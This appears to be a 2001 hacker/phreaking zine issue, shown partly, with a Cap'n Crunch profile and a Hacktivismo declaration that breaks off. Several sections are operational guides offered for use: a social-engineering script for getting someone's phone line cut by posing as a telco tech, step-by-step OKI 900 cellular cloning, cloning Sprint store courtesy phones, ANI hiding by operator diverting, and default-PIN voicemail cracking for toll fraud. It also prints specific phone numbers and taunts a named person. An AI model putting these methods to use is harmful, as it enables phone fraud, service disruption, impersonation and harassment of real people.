@@ -1,0 +1,2311 @@
+
+
+
+H    A    C    K    E    R    '    S        D    I    G    E    S    T
+----------------------------------------------------------------------
+                         www.hackersdigest.com
+SUMMER 2001                                                    ISSUE 1
+
+
+
+
+   			   Da Wutang
+
+        =============================================*
+	|Hello World 
+	============
+ 	|Hacker's Digest Focus Cap 'n Crunch 
+        ====================================
+	|The New AT&T Network 
+        =====================
+        |The Art of the Force Out 
+        =========================
+        |OKI 900 Reprogramming/Cloning in a Nutshell 
+        ============================================ 
+	|Exploring Sprint PCS 
+        =====================
+	|Exploring MTV Telecom 
+        ======================
+     	|International Bookburning in Progress 
+        ======================================
+	|Digital Multiplexing System 
+        ============================ 
+        |Cross Site Scripting the Security Gap 
+	======================================
+        |Shell/PPP Connectivity over Cellular Networks 
+        ==============================================
+        |Nortel Millenium Payphones 
+        ===========================
+        |Writeing Buffer Overflow Exploits 
+        ==================================
+        |What You Don't Know Will Hurt You 
+        =============================================* 
+
+
+
+
++==============================================================================+
+| Get The Latest Issues                                                        |
+|                            Join the Mailing List                             |
+|                            ---------------------                             |
+| E-mail hd-request@hackersdigest.com with the word subscribe in the           |
+| subject line.                                                                |
++==============================================================================+
+
+
+
+
+=========================[     Hello World     ]=========================
+
+
+
+Its here, the first issue of Hacker’s Digest, sixty pages of kung fuck 
+that you would be stupid not to read. You might be asking yourself just 
+what the hell we are trying to do. Our goal is to provide solid 
+information to the hacker/phreaker community. Hackers you say? Those punk 
+kids who billed $5,000 dollars to my credit card? Fuck no... We are not 
+here to defend, support or encourage petty crimes that are done with 
+computers. We are about cutting edge technology, how technology works, 
+its faults, and how it effects our life. We are about learning and answering 
+questions that you can’t ask anywhere else. 
+
+Now that you know what we are about let me explain how we are operate. 
+We offer one year subscriptions for $15.00 and a two year subscription for 
+$30.00. We also have the magazine online for free. Why do we sell and 
+offer the magazine for free? We need the support. Hacker’s Digest operates 
+off of a shoe string budget and we need your support to keep us running. 
+
+There are other ways to support Hacker’s Digest. We need letters, articles, 
+and comments to tell us what you want to see in Hacker’s Digest. Everything 
+you send to us will be read, so send it in. The fact is that we need to 
+know that you are out there and we are going to keep putting issues out 
+and paying the bills as long as we know people are out there giving a damn 
+about what we are doing. 
+
+So how important is it to have a magazine that supports freedom of speech? 
+With new laws being passed such as the Digital Millennium Copy Write Act, 
+cameras in the streets scanning everyone's face to a database that is made 
+up of data that gets populated from the DMV. More worms being released into 
+the wild, feeding the fire about "Cyber Terrorism" You tell me. 
+
+You will not see banners or paid advertisements of any sort on our web site 
+or in our magazine. We are not about making money. We are about providing 
+to the hacking/phreaking community that has provided so much to us. To 
+educate our peers who have educated us. 
+
+You will notice that this issue does not have any letters in it. Well its 
+our first issue so what do you expect. In the future we will offer ten pages 
+of letters so send them in. There is little chance it will not get printed.
+We are also excepting any type of art you could send in. Drawings, logos, 
+and covers. As well as ideas for any covers you might have. Anything will 
+help. 
+
+We could have not gotten this together in time without support from alot 
+of friends. Special thanks to PPC (www.ppchq.org) and Phone Geeks 
+(www.phonegeeks.com). All of our writers and everyone who helped to make 
+this happen.
+
+
+
+===========[     Hacker's Digest Focus Cap 'n Crunch     ]===============
+
+
+
+Who is Cap ‘n Crunch 
+
+Cap ‘n Crunch has to be one of the most well known phone phreaks to go down 
+in history. You may have came across his name in a text file or heard him 
+speak at H2K in the Old Timers panel. According to Cap ‘n Crunch his first 
+adventure into phone phreaking came when he received a call from a blind kid
+who had heard him on the radio from a home made transmitter. He asked the 
+kid for his phone number and he called him back, to his surprise it was a 
+loop. 
+
+He visited the blind kid at his house and he wanted to know if Cap ‘n Crunch 
+could build him a MF’er which is a box that plays 6 tones, 700, 900, 1100, 
+1300, 1500, and 1700 Hz. This is widely known as a blue box. The kid called 
+a 800 number and then seized a trunk with his organ.
+
+Calling a conference line that could only be accessed if you owned a blue box
+Cap ‘n Crunch would talk hours on end about the phone system with other phone 
+phreaks. If they found a problem in the phone system such as a sick trunk they 
+would call the phone company and report the problem. They would get responses 
+such as "We’ve been trying to trace down that stuck tandem for months, how did 
+you find it?". They even had the phone company thinking they worked for them. 
+
+Cap ‘n Crunch’s Arrest 
+
+In 1971 there was a article in the San Jose Mercury about a guy selling blue 
+boxes to members of organized crime. The phone company then tapped the 
+conference line and soon the guy was arrested. To get back at the phone company 
+he got in touch with Ron Rosenbaum who wrote the article "The Secret of the 
+little blue box" that is easily to find this day on the internet. Ron Rosenbaum 
+got in touch with the blind kid for interviews. With out knowing that Cap ‘n 
+Crunch did not want to have anything to do with Ron Rosenbaum the blind kid 
+told him everything. Cap ‘n Crunch ran to a news stand and was shocked at all 
+the errors in the article. He just knew the FBI was going to come for him so 
+he completely stopped everything.
+
+In 1972 Cap ‘n Crunch stopped at a 7-11, as soon as he got out of his car he 
+was jumped by 4 men who threw him against the car, handcuffed him and read 
+him his rights. 
+
+Serving Time 
+
+Cap ‘n Crunch served his time at Lompoc minimum security prison. He bought a 
+radio and modified it to pick up the prison guards walkie talkie’s. He would 
+have a friend wait for him on a loop and would three way other people from 
+there. In jail he showed other inmates how to build cheese boxes. He said it 
+was a challenge to teach people who could hardly read or write how to build 
+things such as laser bug detectors etc... Cap ‘n Crunch volunteered to work 
+in the pig stables. He said that since he grew up on a farm and really liked 
+animals he did not mind the labor. By teaching other inmates, it was a way to 
+keep his mind occupied and make time go a little faster. It also helped his 
+popularity and kept him from having to do the shittiest jobs.
+
+Cap ‘n Crunch and Apple
+
+If you decide to visit Cap ‘n Crunches web site you will see his support for
+apple for being a secure operating system, but his roots with apple go further
+then that. After the article "The Secret of the little blue box" came out, Steve
+Wozniak, co founder of Apple Computers wanted to contact him. Steve Wozniak
+contacted Cap ‘n Crunch and it was not long before he talked him into visiting
+UC Berkeley. When he went to Steve Wozniak’s dorm, he also found Steve Jobs and
+Bill Klaxton waiting for him. He explained how to use it and better what not to
+do with it. He told Steve Wozniak not to sell blue boxes but he did not listen
+and made enough money to pay for school and finance the Apple I project.
+
+Cap ‘n Crunch’s Second Arrest
+
+Yes, Cap ‘n Crunch was arrested a second time. He was friends with great social
+engineering artist named Adam. Adam contacted Cap ‘n Crunch and talked him into
+visiting him. He had broken into COSMOS. This was the phone company’s computer
+system and had the power to do anything. Adam visited him a few more times.  Cap
+‘n Crunch would take him to PotLuck dinn- ers hosted by people’s Computer
+Company. When he was at a food market Adam had flagged him down to a pay phone
+and put it in his face to talk to a friend not knowing how the call was paid. 
+In 1974 Cap ‘n Crunch was arrested again. Come to find out, Adam had sold him
+out to the FBI and had a pay phone tapped so it was like he blue boxed the call.
+He also found out that Adam got a few other people busted that would not have
+got back into blue boxing if Adam did not contact them.
+
+Pranking the President
+
+Cap ‘n Crunch found a way to listen to on going conversations the same way the
+operator can break into a call if its a emergency y. Cap ‘n Crunch was scanning
+the 202 area code which was for the Washington area. They found the CIA Crisis
+hot line. They tapped the number and heard people talking they were sure was
+CIA.  They soon found the code word that would connect them to the president.
+They called up and heard someone say "9337" Cap ‘n Crunch's friend said "Olympus
+please!", the man at the other end said "One moment sir!" sure enough a man that
+sounded alot like Nixon said "What’s going on?". his friend said "We have a
+crisis here in Los Angeles!", Nixon said "What’s the nature of the crisis?", his
+friend said in a serious tone of voice "We’re out of toilet paper sir!". Nixon
+said "WHO IS THIS?" his friend hung up. No one knows what happened to the tapes.
+
+Cap ‘n Crunch Now
+
+Cap ‘n Crunch is currently working on his own business, web hosting and his new
+firewall Intrusion Detection System called the "Crunch Box" that is built on
+OpenBSD.  His web hosting service has to be the most secure servers I have ever
+seen. His whole network is running Mac OS and we all know how many security
+holes there are for the Mac.
+
+I asked him what he thought about phone phreaking groups such as Phone Losers of
+America and he thought they were great. He also said they contacted him and
+asked if he would link to there site. He checked it out and thought they were
+worth the link. I also asked him, if given the chance would he do it all again.
+He told me without a doubt.
+
+Cap ‘n Crunch honestly had to be one of the nicest phone phreaks I have ever
+met.  Its clear that all the hype his name has is well deserved and has not even
+gone remotely close to his head and if you have a chance to email him I would. 
+He has to be the most interesting person I have ever met.
+
+http://www.webcrunchers.com
+
+
+
+=====================[    The New AT&T Network     ]=====================
+=====================[        by Lucky225          ]=====================
+
+
+It seems that AT&T was not to fond of my ANI Spoofing article that appeared in
+2600 (17:4) Just a few days after I picked up a copy of the new 2600 and saw
+that my article had been printed, I started noticing a lot of changes in the
+AT&T network. First they shut off their 800 ANAC, a few days later calls that
+were routed to 800-673-7286 by the Verizon Long Distance operator were handled
+strangely. I began noticing that if I made a call through the Verizon Long
+Distance operator to 800-673-7286, I could place calls to 800 numbers NOT on the
+AT&T network, but that the ANI was being sent as '615-986-9873' or ANI II Pair
+23 followed by areacode 904. Thus, calls placed through the Verizon Long
+Distance operator to AT&T's 800-operator could not be used to spoof ANI any
+more. The 615 number belongs to a PBX owned by AT&T in Nashville, TN. I could
+still spoof ANI on the AT&T network if I diverted through my local operator or
+various other 101XXX long distance carrier operators, but this April it stopped
+working. I soon figured out what was happening. AT&T has centers all around the
+country including Alaska and Hawaii.  The way SS7 works, depending on where your
+calling from, an 800 number can be routed to various other places. For example
+their could be a nationwide 800 number that alows you to call from any where in
+the country, but say a person that calls the same 800 number from Florida could
+get routed to that business's office on the east coast, and a person that calls
+from California may get routed to the west coast office. That's what it's like
+when you call 800-673-7286, you get routed to the nearest AT&T center near you
+to take the call. So when I was making a call through the Verizon Long Distance
+operator to 800 673 7286 I would get routed to the Florida AT&T center because
+the Verizon Long Distance operator I got was based out of Florida(813), which is
+why when I had the AT&T operator dial an ANAC it would show 23-904(Florida).
+However, not all Verizon Long Distance operators are based in Florida, some of
+them are based out of Kentucky(606) which for whatever reason will get you the
+Nashville, TN Center. The Nashville Center is the only center I have seen so far
+that transmits ANI with ANI II Pair "00" and a full 10 digit phone
+number(615-986-9873)
+
+The AT&T Centers: As I mentioned, there are various AT&T centers throughout the
+country, and they are also the centers that handle the automated AT&T Long
+Distance operator services as well as 800-call-att and 800-operator. With the
+new upgrade that AT&T is implementing (wide spread across the country I preditct
+by now) each center is geting a total make over, there will be no more ANI
+spoofing to AT&T numbers, they are updating these centers so that you can call
+any 800 number through the AT&T carrier. Calls to 800 673 7286 that have an ANI
+fail will no longer use the phone number you give as ANI when calling other toll
+free numbers. Instead, ANI II pair 23 and the areacode of the AT&T center will
+be used. However, the best part is that you can place calls to toll free numbers
+without speaking to an operator. Simply dial 10-10-ATT-0(10-10-288-0) and enter
+the toll free number you want to call. The ANI will show up as ANI II pair 23
+and the areacode of the AT&T Center, op diverting without even having to speak
+to the op! However you will notice that if you try to dial 800-call-att or
+800-673-7286 it will apear that your ANI still shows up, this is because these
+numbers are handled by the same AT&T center. However any toll-free number not
+handled by the AT&T center(basically any toll-free number that's not used for
+AT&T operator services) will be processed with your ANI not being transmited. 
+There are a few advantages and disadvantages of this new system. The only real
+disadvantage is that you can not spoof ANI any more. The advantages however are
+that you can place calls to basically any toll free number you wish without your
+ANI being passed simply by dialing 10-10-ATT-0 and then pressing in the toll
+free number you want to call at the AT&T prompt. You can even use this at
+payphones to call toll free numbers that don't allow payphone calls or to get
+around payphone surcharges. Op diverting used to be so hard, local ops not
+wanting to help you out, and 101XXX carrier ops only being able to be reached
+from certain parts of the country, and the real downside being that you had to
+talk to an operator, that by the way might listen in to your call, when trying
+to divert to toll free numbers, but now thanks to AT&T's new network that you
+can reach anywhere in the country by simply dialing 10-10-288-0 or even just 00
+if you have AT&T, and you dont even have to talk to an operator you just punch
+in the toll free number you want to call on your touch tone keypad. You can even
+divert to that toll-free number using your modem to find out what that carrier
+is you always wanted to know is by setting your modem to dial 10-10-288-0,
+1-800-xxx-xxxx, without fear of your ANI showing up. I'm sure AT&T logs your ANI
+and probably would take action if you were harassing a toll-free number long
+enough, but for now you can think of 10-10-288-0 as your own free ANI blocking
+service.
+
+Refrence:This is a follow up to an article in 2600 17:4 titled "Confusing ANI
+and Other Phone Tricks"
+
+
+
+=====================[  The Art of the Force Out   ]=====================
+=====================[            by herf          ]=====================
+
+
+
+You may have read texts on social engineering cheeseburgers from McDonalds but
+that is not what this paper is about. I will go into getting a circuit busied
+out using your telco's dumbass repair techs.
+
+I'm sure your question has shifted to how? It's actually pretty simple.
+
+Ok, I'll go over having a person's line busied out.
+
+Before accomplishing this, you'll need to understand what having a circuit
+busied out means. When out on a job, field technicians have to get a ciccuit
+disconnected for a short period of time before working on the line. Why? 
+Because 110 volts of electricity surges through the circuit when phones ring. 
+Bascially, if you were holding both tip and ring and the circuit tried to
+connect a call, you'd be unpleasently shocked out of your mind. So, to avoid
+lawsuits from their field techs, telco tech support enables circuits to be
+remotely severed.
+
+Now, you'll need to make an identity for yourself. As for myself, I most
+commonly refer to myself as Chris Knight and use an employee ID I found in Bell
+Atlantic's trash. I have a fake voices I use to connect personally with whatever
+repair tech I talk to. If it's a black man or woman, I speak using a black man's
+accent with a touch of Southern. If it's a white man or woman, I speak like a
+redneck. The reason I do this is to fool the repair tech into thinking I'm
+beneath them, into thikning that my intellectual capacity is that of a carrot.
+Why? Because if they think their time is more important then mine, they'll
+become impatient and do whatever I want them to.
+
+The engineering aspects of having someone's circuit busied out are pretty
+mindless. Get your telco's field tech support number, for one. Social
+engineering it out of the CO is pretty easy. All you have to do is ask to speak
+with a supervisor, tell him you're out on a ticket, you're new and the presets
+on your set aren't working correctly. If he asks where your reference sheet is,
+tell him it's buried underneath your equipment somewhere. If he still resists,
+tell him you're already in overtime and you need to get in touch with field tech
+support before working on the line. When he hears the term "Overtime" he'll
+oblige because he's a nazi.
+
+Ok, make sure to op divert to the field tech support toll free number because
+you don't want to go to jail. Once connected, enter in whatever menu number it
+is to speak with a repair technician. When the repair tech gives the cute little
+welcome schpiel, ask their name again to show you care. When you speak, make
+sure you sound like a disgruntled employee to relate with them. Announce your
+name and ID number. If you don't have one, they're usually 3 digits. Just make
+one up. If they say it's not listed, tell them you just got out of training.
+Anyway, open the conversation like this: "Hey, what's your name again? - Oh, ok.
+Well (blank), I'm out on a trouble ticket and I need to get a circuit forced
+out." - They'll ask why you haven't called your CO to get it done. That's when
+you say, "Well, I tried calling my CO but the line has been busy for 30 minutes.
+Same with the WMC. I'm already on overtime and my foremer(foreman) doesn't like
+that so I took desperate measures. Can you help me out or transfer me to someone
+who can, please?"
+
+When they say yes, you're in. It's only a matter of sounding authenticate. If
+you can't sound authenticate, you probably shouldn't be doing this anyway.
+
+Ok, so now you know and knowing is the first step to serious jail time.
+
+Oh, below, I'll list some acronyms that might help to authenticate yourself.
+
+WMC - Work Maintenence Center (Verizon+) WAC - Work Assessment Center
+(Bellsouth- Appended by khecka) NOC - Network Operations Center IR - Tech ID
+Trouble Ticket - Issued to field technicians to identify different jobs. 
+Former(Foreman) - Boss SISSYTECH - Slang for a technician who only does house
+repair..  Force Out - Busy Out
+
+Peace and Fleece. One step closer to having your sheep ID revoked.
+
+
+
+==============[OKI 900 Reprogramming/Cloning in a Nutshell]==============
+==============[             by dark_fairytale             ]==============
+
+
+
+Ok, so you've read the Oki 900 Guide by Iceberg and you still don't fully
+understand how to reprogram/clone your Oki 900. Well now i'm going to explain in
+the simplest terms possible on just how to do just that for those of you that
+still don't understand.
+
+Materials Needed:
+
+Oki 900 with 4712 Chip Modification A Valid Esn and Nam Pair (ESN should already
+be in hex)
+
+Ok, now if you don't know what a Esn and Nam pair is then you shouldn't be
+reading this. However, if you do, continue on. The very first thing you'll need
+to do is to put your Oki 900 into test mode/debug mode by doing the following:
+Power up the phone. Hold down the 7 and 9 buttons for about a second, release.
+Quickly enter Menu, Snd, End, Rcl, Sto, Clr. The phone should now read Good
+timing!!! If not, start over. If all goes well up until here hit 1 and 3 buttons
+at the same time and it will clear the Good timing from the display. Ok, now
+you're ready to program in your ESN. You have 5 locations for ESN is you are
+using the 4712 chip mod and you will have to program in each byte of ESN
+separately in it's separate location in order for it to work. To begin
+programming the ESN into the phone: hit #54 followed by the 4 digit location
+followed by the byte of ESN then Snd
+
+Every ESN location is as follows:
+
+-Esn 1 Locale- BE8E BE8F BE90 BE91
+
+-Esn 2 Locale- BE93 BE94 BE95 BE96
+
+-Esn 3 Locale- BE98 BE99 BE9A BE9B
+
+-Esn 4 Locale- BE9D BE9E BE9F BEA0
+
+-Esn 5 Locale- BEA2 BEA3 BEA4 BEA5
+
+Now you may be looking at this and still wondering, what the fuck? Ok, let me
+explain more clearly here. An ESN is an 8 digit/letter number combination when
+properly put into hex mode which will be needed when reprogramming the ESN. When
+reprogramming the ESN you will enter it two digits/letters at time into the Oki.
+For example, let's say your ESN is: BD94-A623 and you want to program that into
+ESN Slot 1. Therefore you would program: BD into location BE8E, 94 into BE8F,
+and so on.... Ok, I hope that helps a little for you beginners. When
+reprogramming your ESN more than likely you will have to program in a letter. To
+get letters all you simply need to do is hit the * key on the phone before
+hitting the corresponding number. Here is a key for that as well:
+
+STAR KEY A=*1 B=*2 C=*3 D=*4 E=*5 F=*6
+
+On last quick note on reprogramming the ESN, hit # before each entry and send to
+save it before you move on. Ok,now after you get the full ESN programmed in you
+will have to reboot the phone. So simply turn the phone off for a second or two
+and turn it back on. Now comes reprogramming the NAM. As soon as you power up
+the phone you will have to: Hold Rcl and Mnu at the same time for a second or
+two, release. Quickly followed by *,6,2,7,2,9,8,5,4,#. If entered correctly some
+numbers will pop up on the display followed by the words Dealer which means just
+that, you are in Dealer mode and your NAM is ready to be reprogrammed. Ok, now
+use the volume button on the side to scroll down to the corresponding NAM to the
+ESN you just programmed in.  Let the display sit there for a second and the
+prompt will then come up Own #. Now re-enter the NAM that you have for your ESN
+and hit STO. With that being done hit the Down Volume button three times and you
+should see a prompt that reads ACCOLC #. Here you need to enter 0 followed by
+the last digit of the NAM you are programming in and hit STO once more. Once
+that is done shut the phone off once more to reboot and power it back on. Now
+you are ready to select your NAM and ESN from the Admin Menu to put it to use.
+When the phone powers back up hit Menu 8 times for the Admin Menu to appear. Hit
+recall to access it and enter your security code. The default password on most
+phones is 123456, but please note that it can be changed. Once into the Admin
+menu hit RCL to choose the NAM you want to use and hit STO and the prompt should
+appear: RESET TIMER. Turn the phone off and turn it back on and you're almost
+done. Now getting the ESN and NAM to work properly may take some experimenting
+with the carrier selection which varies from A to B. Most A side carriers are
+hard to clone do to rf fingerprinting. To access the carrier selection again hit
+Menu 8 times and go into the Admin menu. Enter your password and hit the Down
+volume arrow button until you see the System Prefer followed by whichever
+carrier is selected. Hit STO to select. Try your pair with A, if that doesn't
+work simply go back and Try with B. If that doesn't work, than you have a bad
+pair and should go out and get another. Ok, I hope this text file has helped
+those who have had trouble understanding the concept of reprogramming/cloning
+the OKI 900 with 4712 MOD and if it hasn't then i strongly suggest you find a
+new hobby. Thanks for reading.
+
+References: The Complete Oki 900 Guide by Iceberg.
+
+Shouts:  PPC UP$ P.O.T.S.  Plexus Liquid Illusion Comic_1 DrDaedlus Redxer
+HateServ
+
+the list goes on and on......
+
+
+=====================[     Exploring Sprint PCS    ]=====================
+=====================[           by Okiwan         ]=====================
+
+
+
+Introduction Here's a sweet exploit I came up with while waiting in line at the
+Sprint PCS store. First a little back story, Sprint PCS is a digital CDMA
+network making it virtually impossible to clone...or so we thought. The weakness
+of Sprint's network is that there digital coverage is pathetic. To fill up the
+HUGE holes in their network, Sprint has roaming agreements throughout the US.
+The roaming agreement is that whenever there isn't a digital signal (1900) the
+phones will drop to analog (800) which is what Sprint calls "roaming".
+
+THE EXPLOIT Every Sprint PCS store has a sales floor where they have activated
+phones that you can pick up and use. Sprintstores do that so you can try out
+their phones to hear the sound quality of each different phone before you buy
+one or to call home(or anyone) as a courtesy call. In fact, every time I go to a
+Sprint store I always make at least 15-20 prank calls all over the US.
+
+Basically all you need to do is:  1)Go through the menu and look for the phone's
+telephone number which is your MIN (mobile id number) 2)Look at the back of the
+phone and find an 8 character number/letter sequence and this is your ESN.
+3)Program the ESN and MIN into your analog OKI-900 phone.
+
+Guess what you just cloned the Sprint PCS's courtesy phone. So when you use your
+cloned OKI-900 phone, Sprint PCS will think your roaming since your using an
+analog only phone.
+
+These phones are activated using unlimited calling minutes and I doubt that the
+Sprint PCS store looks though the hundreds off phones calls that are made from
+these phones each month so there's little to no chance of getting caught. 
+There's like 7-8 different models out right now so you should get all 7-8
+accounts and use'em like crazy.
+
+
+=====================[   Exploring MTV Telecom     ]=====================
+=====================[     by dark_fairytale       ]=====================
+
+
+
+MTV. You all know the name. You've all probably watched it at one time or
+another. Who hasn't? One day this past spring , I happened to be watching MTV.
+In fact it was an episode of Total Request Live. If you haven't seen this (which
+most of you probably have) show, I'll cover the premise briefly.  Carson Daly
+hosts this live daily show from MTV Studios in New York, NY, which basically
+caters to the teeny bopper fad of boy bands and Britney Spears.  Every once in a
+brief while you might actually see a real band in a video, but very rarely. Go
+figure. Anyways, I'm sitting there watching this show, TRL, when they say
+they're gonna have a contest. WOWIE! A contest that will go something like this:
+In every top 10 video there will be a hint/clue/question asked and the answer is
+a number. When all the numbers are revealed, you will have the phone number for
+the TRL Studio Phone which is no more than ten feet away from Carson Daly's fat
+head.
+
+Now normally, I wouldn't be impressed with their cheesy contests, but this one
+somehow piqued my interest. Imagine having the number to that phone to disrupt
+their live show day after day to constantly harass Carson Daly. Oh what fun that
+would be! Eh! I had to have this number. So I raced for a pen and paper and sat
+through the whole damn show jotting down number after number.  But, before the
+show had ended, I had remembered someone mentioning to me before that MTV/Viacom
+had it's very own exchange in New York. Why would such a company have it's very
+own exchange, is beyond my comprehension, but tis true.  The Viacom exchange is
+212 846. I had these first six numbers, because I already had a number within
+MTV studios that i knew was legit.
+
+So on with the contest with my cheating going on already. Well turns out, MTV
+decided to give everyone a chance to win the contest earlier than expected by
+having the number 2 video question be, "how many times is rollin said in the
+following video Limp Bizkit's Rollin?" equal out to the last 2 digits of the
+phone number. Up to this point, I had all the numbers correct. But somehow the
+light gleaming off of Fred Durst's bald head threw me off and I got confused and
+blew that. Foiled again! After someone rang the phone next to Carson Daly, they
+scrolled the number by on the screen for the phone and I quickly jotted it down.
+I raced for the phone to give Carson Daly a call.
+
+I quickly dialed 212 846 5581. The phone rings a couple times and a woman
+answers. S o I say, "Hello." She says, "Who is this?" so i reply with, "Uhhhhh,
+who is this??" She then proceeds to yell at me and say, "THEY MESSED UP! QUIT
+CALLING! THEY GAVE OUT THE WRONG NUMBER ON THE AIR!" and slams the phone down.
+
+What? MTV messed up and gave out one of their MTV employees phone numbers
+instead?  Apparently so, since I obviously wasn't the first confused person this
+woman had talked to and she was obviously ticked off about the whole ordeal, but
+someone had rang the MTV phone to claim their prize. So was it just a mix up on
+the winner's behalf? Was the whole contest rigged? I'm still not sure to tell
+you the truth, and I don't really care, but this is what started my mission.
+
+My mission really had no climax or finality to it. I was just determined to come
+up with some interesting phone numbers in the MTV/Viacom system by demon dialing
+the exchange. I also made it a real point to come up with that "secret" MTV TRL
+phone number so i could talk to Carson during the show.
+
+Anyways after hours of dialing and dialing I finally realized that MTV had a ton
+of people working for them I never heard of. Useless people that probably no one
+in the world had even heard of to tell you the truth. I also discovered that MTV
+uses a Nortel Meridian system for it's telephony needs. We all know just how fun
+these can be to play with. If you don't know what I'm talking about, let me
+explain. Nortel manufactures these wonderous devices which are installed with
+default, usually 4 number, pins. What that means is the pin for a 4 digit
+mailbox will match the login if it isn't changed by the owner. You can usually
+crack into these babies within ten minutes using random guessing at numbers and
+a little common sense. Did I also fail to mention that some Meridians are
+equipped with outdialing features? I think you know what I'm getting at. One
+could easily rack of tons of toll fraud on MTV's behalf if they really wanted to
+and with what i'm sure is a multi-million dollar network, they would probably
+never even notice.
+
+Anyways, back to the story. I'm dialing around and dialing around when I finally
+realize this is completely useless. The chances of me finding anyone famous'
+number is a long shot at the rate I'm going. So what do I do? I give up.
+
+What does it matter? I already have Serena Altschul's MTV number and it's not
+that hard to run across on the internet if you know the right people. I've
+talked to her on a couple occassions and may I say, she is not the most
+courteous person on the telephone. Serena, if you're reading this, I don't like
+you. Just thought I would say that.
+
+So what I have learned here? I've learned that MTV does in fact have their own
+exchange in New York, to reasons unknown to me. MTV's telephone network operates
+off a Nortel Meridian System. MTV pays a lot of useless people to sit around all
+day, and I have a few interesting numbers. So I have this text file now of names
+and numbers at MTV Viacom and I've narrowed the numbers down to what I think may
+be the TRL phone. My guess is: 212 846 5781, (which usually rings and rings. Did
+they turn the ringer off? Rats, foiled again.)but I'm pretty sure they could
+change the thing if they really wanted which is a total letdown nonetheless.
+Failure, curiosity, and sore fingers. It's all in days' work for this common
+phreak.
+
+
+=================[INTERNATIONAL BOOKBURNING IN PROGRESS]==================
+=================[       by Cult of the Dead Cow       ]==================
+
+
+
+Free speech is under siege at the margins of the Internet. Quite a few countries
+are censoring access to the Web through DNS [Domain Name Service] filtering.
+This is a process whereby politically incorrect information is blocked by domain
+address -- the name that appears before the dot com suffix.  Others employ
+filtering which denies politically or socially challenging subject matter based
+on its content.
+
+Hacktivismo and the CULT OF THE DEAD COW have decided that enough is too much. 
+We are hackers and free speech advocates, and we are developing technologies to
+challenge state-sponsored censorship of the Internet.
+
+Most countries use intimidation and filtering of one, kind or another including
+the Peoples Republic of China, Cuba, and many Islamic countries. Most claim to
+be blocking pornographic content. But the real reason is to prevent challenging
+content from spreading through repressive regimes. This includes information
+ranging from political opinion, "foreign" news, women's issues, academic and
+scholarly works, religious information, information regarding ethnic groups in
+disfavor, news of human rights abuses, documents which present drugs in a
+positive light, and gay and lesbian content, among others.
+
+The capriciousness of state-sanctioned censorship is wide-ranging. [1]
+
+* In Zambia, the government has attempted to censor information revealing their
+plans for constitutional referendums.
+
+* In Mauritania -- as in most countries --, owners of cybercafes are required to
+supply government intelligence agents with copies of e-mail sent or received at
+their establishments.
+
+* Even less draconian governments, like Malaysia, have threatened web-publishers
+for violating their publishing licenses by publishing frequent updates: _timely,
+relevant_ information is seen as a threat.
+
+* South Korean's national security law forbids South Koreans from having any
+contact -- including contact over the Internet -- with their North Korean
+neighbors.
+
+* Sri Lanka threatened news sites with possible revocation of their licenses if
+coverage of a presidential election campaign was not partial to the party of the
+outgoing president.
+
+The risks of accessing or disseminating information are often great.
+
+* In Ukraine, a decapitated body found near the village of Tarachtcha is
+believed to be that of Georgiy Gongadze, founder and editor of an on-line
+newspaper critical of the authorities.
+
+* In August, 1998, eighteen year old Turk Emre Ersoz was found guilty of
+"insulting the national police" in an Internet forum after participating in a
+demonstration that was violently suppressed by the police. His ISP provided the
+authorities with his address.
+
+* Journalist Miroslav Filipovic has the dubious distinction of having been the
+first Journalist accused of spying because of articles published on the Internet
+-- in this case detailing the abuses of certain Yugoslav army units in Kosovo.
+
+We are sickened by these egregious violations of information and human rights.
+The liberal democracies have talked a far better game than they've played on
+access to information. But hackers are not willing to watch the custodians of
+the International Convention on Civil and Political Rights and the Universal
+Declaration of Human Rights turn them into a mockery. We are willing to put our
+money where our mouth is.
+
+Hacktivismo and the CULT OF THE DEAD COW are issuing the HACKTIVISMO DECLARATION
+as a declaration of outrage and a statement of intent. It is our Magna Carta for
+information rights. People have a right to reasonable access of otherwise
+lawfully published information. If our leaders aren't prepared to defend the
+Internet, we are.
+
+---------------------------------------------------------------------
+
+[1] some information cited in this press release was either paraphrased, or
+quoted directly, from the "Enemies of the Internet" report published by
+Reporters Without Frontiers, and may be found at http://www.rsf.fr
+
+THE HACKTIVISMO DECLARATION assertions of liberty in support of an uncensored
+internet
+
+
+DEEPLY ALARMED that state-sponsored censorship of the Internet is rapidly
+spreading with the assistance of transnational corporations,
+
+TAKING AS A BASIS the principles and purposes enshrined in Article 19 of the
+Universal Declaration of Human Rights (UDHR) that states, _Everyone has the
+right to freedom of opinion and expression; this right includes freedom to hold
+opinions without interference and to seek, receive and impart information and
+ideas through any media and regardless of frontiers_, and Article 19 of the
+International Covenant on Civil and Political Rights (ICCPR) that says,
+
+1. Everyone shall have the right to hold opinions without interference.
+
+2. Everyone shall have the right to freedom of expression; this right shall
+include freedom to seek, receive and impart information and ideas of all kinds,
+regardless of frontiers, either orally, in writing or in print, in the form of
+art, or through any other media of his choice.
+
+3. The exercise of the rights provided for in paragraph 2 of this article
+carries with it special duties and responsibilities. It may therefore be subject
+to certain restrictions, but these shall only be such as are provided by law and
+are necessary:
+
+(a) For respect of the rights or reputations of others;
+
+(b) For the protection of national security or of public order, or of public
+health or morals.
+
+RECALLING that some member states of the United Nations have signed the ICCPR,
+or have ratified it in such a way as to prevent their citizens from using it in
+courts of law,
+
+CONSIDERING that, such member states continue to willfully suppress wide-ranging
+access to lawfully published information on the Internet, despite the clear
+language of the ICCPR that freedom of expression exists in all media,
+
+TAKING NOTE that transnational corporations continue to sell information
+technologies to the world's most repressive regimes knowing full well that they
+will be used to track and control an already harried citizenry,
+
+TAKING INTO ACCOUNT that the Internet is fast becoming a method of repression
+rather than an instrument of liberation,
+
+BEARING IN MIND that in some countries it is a crime to demand the right to
+access lawfully published information, and of other basic human rights,
+
+RECALLING that member states of the United Nations have failed to press the
+world's most egregious information rights violators to a higher standard,
+
+MINDFUL that denying access to information could lead to spiritual,
+intellectual, and economic decline, the promotion of xenophobia and
+destabilization of international order,
+
+CONCERNED that governments and transnationals are colluding to maintain the
+status quo,
+
+DEEPLY ALARMED that world leaders have failed to address information rights
+issues directly and without equivocation,
+
+RECOGNIZING the importance to fight against human rights abuses with respect to
+reasonable access to information on the Internet,
+
+THEREFORE WE ARE CONVINCED that the international hacking community has a moral
+imperative to act, and we
+
+DECLARE:
+
+* THAT FULL RESPECT FOR HUMAN RIGHTS AND FUNDAMENTAL FREEDOMS INCLUDES THE
+LIBERTY OF FAIR AND REASONABLE ACCESS TO INFORMATION, WHETHER BY SHORTWAVE
+RADIO, AIR MAIL, SIMPLE TELEPHONY, THE GLOBAL INTERNET, OR OTHER MEDIA.
+
